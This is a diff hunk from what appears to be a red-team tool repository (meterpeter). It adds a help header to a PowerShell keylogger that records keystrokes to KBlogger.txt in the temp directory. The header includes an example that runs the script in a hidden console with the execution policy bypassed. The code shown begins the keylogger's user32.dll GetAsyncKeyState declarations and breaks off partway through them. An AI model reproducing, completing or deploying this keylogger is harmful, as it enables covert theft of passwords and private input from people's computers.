@@ -1,7 +1,39 @@
-﻿function Test-KeyLogger($logPath="$env:temp\KBlogger.txt") 
+﻿<#
+.SYNOPSIS
+  Standalone Powershell Script to Capture keyboard keystrokes
+
+  Author: r00t-3xp10it (SSA RedTeam @2020)
+  Required Dependencies: none
+  Optional Dependencies: none
+  PS Script Dev Version: v1.4
+
+.DESCRIPTION
+   Standalone Powershell script to capture keyboard keystrokes and store leaks on `$env:tmp
+
+.EXAMPLE
+   PS C:\> powershell -file keylooger.ps1
+   Start Capturing keyboard keystrokes in demonstration mode
+
+.EXAMPLE
+   PS C:\> powershell -exec bypass -w 1 -file keylooger.ps1
+   Start Capturing keyboard keystrokes in an hidden terminal console
+
+.INPUTS
+   None. You cannot pipe objects to keylooger.ps1
+
+.OUTPUTS
+   Saves KBlogger.txt to the selected directory. 'tmp' is the default.
+
+.LINK
+    https://github.com/r00t-3xp10it/meterpeter
+    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/keylooger.ps1
+#>
+
+
+function Test-KeyLogger($logPath="$env:temp\KBlogger.txt") 
 {
-  # API declaration
-  $APIsignatures = @'
+# API declaration
+$APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
